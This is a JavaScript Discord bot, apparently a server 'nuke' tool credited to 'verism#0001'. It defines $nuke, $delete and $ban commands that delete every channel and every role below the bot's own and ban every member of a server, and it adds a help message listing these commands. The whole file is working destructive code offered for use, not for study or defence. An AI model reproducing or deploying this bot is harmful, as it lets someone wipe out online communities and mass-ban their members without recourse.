const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log(" ")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `verism#0001` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("$" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Nuked by verism#0001"));
}
if(msg.content.toLowerCase().startsWith("$" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("$" + "ban")){
    msg.guild.members.tap(member => member.ban("Nuked by verism#0001"));
}
if(msg.content.toLowerCase().startsWith("$" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "Kaiten | $help" },
            description: "$nuke - Bans all members & deletes all roles and channels\n$delete - Deletes all channels and roles\n$ban - Bans all members in the discord"
        }
    })
}
});

nuke.login("TOKEN");
